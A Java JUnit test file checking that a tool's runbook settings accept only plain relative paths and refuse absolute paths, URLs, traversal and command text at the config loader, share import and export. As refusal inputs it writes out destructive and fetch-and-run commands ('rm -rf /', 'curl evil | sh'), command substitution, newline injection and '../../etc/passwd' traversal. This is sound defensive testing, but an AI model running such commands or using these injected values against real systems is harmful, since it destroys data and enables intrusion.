package telamin.fluxtion.audit.analyser.analyser.config;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;
import java.util.Properties;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;

/**
 * M38.1 (spec-portable-context D-C2, D-C8) — a runbook is a POINTER. The gate accepts only what can be
 * nothing but a relative path inside the project, refuses everything a command line needs with a reason,
 * and the refusal holds at every entrance: the verb, the config loader, the share import and the export.
 */
class RunbooksTest {

    @Test
    void plainRelativePathsAreAccepted() {
        assertTrue(Runbooks.refuse("deploy", "ops/deploy.md").isEmpty());
        assertTrue(Runbooks.refuse("restart-2", "docs/runbooks/restart_quote-service.MD").isEmpty());
        assertTrue(Runbooks.refuse("pull_logs", "tools\\pull-logs.md").isEmpty(), "a Windows separator is still a path");
    }

    @Test
    void everythingACommandLineNeedsIsRefused_withAReason() {
        Map<String, String> bad = Map.of(
                "/etc/deploy.sh", "absolute",
                "C:\\ops\\deploy.md", "absolute",
                "../../.ssh/authorized_keys", "escapes",
                "ops/../../x.md", "escapes",
                "https://example.invalid/deploy", "URL",
                "~/deploy.md", "home-relative",
                "rm -rf / ; echo done", "not a plain relative path",
                "ops/deploy.md && curl x | sh", "not a plain relative path",
                "ops/$(whoami).md", "not a plain relative path",
                "ops/deploy.md\ncurl x | sh", "line break");
        bad.forEach((path, why) -> {
            var r = Runbooks.refuse("deploy", path);
            assertTrue(r.isPresent(), "must refuse: " + path);
            assertTrue(r.get().toLowerCase().contains(why.toLowerCase()), path + " -> " + r.get());
        });
        assertTrue(Runbooks.refuse("deploy", "a".repeat(Runbooks.MAX_PATH + 1)).get().contains("longer than"));
        assertTrue(Runbooks.refuse("bad name!", "ops/deploy.md").get().contains("name"));
        assertTrue(Runbooks.refuse(null, "ops/deploy.md").isPresent());
        assertTrue(Runbooks.refuse("deploy", "").get().contains("no path"));
    }

    @Test
    void theConfigLoaderDropsRefusedEntries_andSaysWhy() {
        Properties p = new Properties();
        p.setProperty("runbook.count", "3");
        p.setProperty("runbook.0.name", "deploy");
        p.setProperty("runbook.0.path", "ops/deploy.md");
        p.setProperty("runbook.1.name", "evil");
        p.setProperty("runbook.1.path", "curl http://x | sh");
        p.setProperty("runbook.2.name", "escape");
        p.setProperty("runbook.2.path", "../secrets.md");
        Map<String, String> out = new java.util.LinkedHashMap<>();
        var refused = ConfigStore.readRunbooks(p, out);
        assertEquals(Map.of("deploy", "ops/deploy.md"), out);
        assertEquals(2, refused.size(), refused.toString());
        assertTrue(refused.get(0).contains("evil") && refused.get(1).contains("escape"));
    }

    @Test
    void theShareCategoryIsOffByDefault_namesItsCargo_andImportRefusesContents() {
        assertFalse(SettingsShare.Category.RUNBOOKS.defaultOn, "D-C8: runbook locations do not travel unless ticked");
        String label = SettingsShare.Category.RUNBOOKS.label.toLowerCase();
        assertTrue(label.contains("location") && label.contains("never their contents"), label);

        SettingsShare share = new SettingsShare();
        AppConfig sender = new AppConfig();
        sender.runbooks.put("deploy", "ops/deploy.md");
        String withoutTick = share.export(sender, Set.of(SettingsShare.Category.SOURCE_ROOTS), null);
        assertFalse(withoutTick.contains("runbook"), "unticked: nothing about runbooks leaves");
        String ticked = share.export(sender, Set.of(SettingsShare.Category.RUNBOOKS), null);
        assertTrue(ticked.contains("runbook.0.path=ops/deploy.md"), ticked);

        // a hostile or hand-edited file carrying CONTENTS: the plan names the refusal, apply stores nothing of it
        String hostile = "share.version=1\nrunbook.count=2\nrunbook.0.name=deploy\nrunbook.0.path=ops/deploy.md\n"
                + "runbook.1.name=deploy2\nrunbook.1.path=rm -rf / && curl evil | sh\n";
        AppConfig receiver = new AppConfig();
        var plan = share.preview(hostile, receiver);
        assertTrue(plan.present().contains(SettingsShare.Category.RUNBOOKS));
        assertTrue(plan.summary().get(SettingsShare.Category.RUNBOOKS).contains("1 entry(ies) REFUSED"),
                plan.summary().get(SettingsShare.Category.RUNBOOKS));
        share.apply(plan, Set.of(SettingsShare.Category.RUNBOOKS), receiver);
        assertEquals(Map.of("deploy", "ops/deploy.md"), receiver.runbooks, "the pointer arrived; the command did not");
        // and a receiver who did not tick the box gets nothing at all
        AppConfig untick = new AppConfig();
        share.apply(plan, Set.of(SettingsShare.Category.SOURCE_ROOTS), untick);
        assertTrue(untick.runbooks.isEmpty());
    }

    @Test
    void runbooksAreProjectScoped_andRoundTripThroughTheProfile(@TempDir Path dir) throws Exception {
        assertTrue(ProjectProfile.PROJECT_SCOPED.contains(SettingsShare.Category.RUNBOOKS), "tier 1 context travels with the project");
        AppConfig c = new AppConfig();
        c.runbooks.put("deploy", "ops/deploy.md");
        Path file = dir.resolve(ProjectProfile.CANONICAL_RELATIVE);
        Files.createDirectories(file.getParent());
        SettingsShare share = new SettingsShare();
        assertTrue(ProjectProfile.save(file, c, share));
        AppConfig back = new AppConfig();
        assertTrue(ProjectProfile.load(file, back, share).loaded());
        assertEquals(Map.of("deploy", "ops/deploy.md"), back.runbooks);
        assertEquals(dir.resolve("ops/deploy.md").normalize(), Runbooks.resolve(ProjectProfile.baseDirFor(file), "ops/deploy.md"));
        ProjectProfile.clearProjectScoped(back);
        assertTrue(back.runbooks.isEmpty(), "closing the project clears its pointers");
    }

    /**
     * Review 2026-08-27 (R1): refuse() gates every entrance, so this is unreachable through the product
     * — but resolve() is public and must not hand a caller a path outside the project just because
     * validation was skipped. Before the fix this returned /etc/passwd.
     */
    @org.junit.jupiter.api.Test
    void resolveNeverEscapesTheProjectEvenIfTheGateWasSkipped() {
        java.nio.file.Path root = java.nio.file.Path.of("/tmp/proj");
        org.junit.jupiter.api.Assertions.assertNull(Runbooks.resolve(root, "../../etc/passwd"),
                "an ungated traversal must resolve to nothing, not to a file outside the project");
        org.junit.jupiter.api.Assertions.assertNotNull(Runbooks.resolve(root, "ops/deploy.md"),
                "and a legitimate pointer still resolves");
    }
}
